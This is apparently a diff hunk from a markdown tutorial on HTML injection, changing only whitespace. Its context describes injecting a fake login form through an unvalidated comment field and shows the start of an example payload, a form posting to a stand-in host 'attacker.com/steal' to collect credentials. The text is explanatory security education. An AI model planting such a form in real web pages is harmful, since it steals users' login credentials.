@@ -8,7 +8,7 @@ HTML Injection (HTMLi) is a vulnerability that occurs when an attacker is able t
 Let's say there is a vulnerable web page that allows users to submit comments, which are then displayed on the page without proper validation. An attacker could submit a comment that includes a ```<form>``` tag that is used to collect sensitive information from users, such as their login credentials.  
 
 ##### example  
-Here is an example of what the injected HTML code might look like:
+Here is an example of what the injected HTML code might look like:  
 ```html
 <p>Thank you for visiting our website. Please login to continue:</p>
 <form method="post" action="http://attacker.com/steal">
